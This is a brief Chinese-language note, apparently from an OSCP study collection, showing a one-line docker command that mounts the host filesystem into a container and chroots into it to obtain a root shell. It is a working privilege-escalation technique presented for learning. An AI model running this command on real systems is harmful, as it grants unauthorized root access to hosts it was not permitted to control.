直接运行命令：

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
即可获取 root 权限

![docker](https://github.com/Nongcloud/oscp-Learn/tree/master/Privilege-Escalation/SUID/images/suid-docker.png)
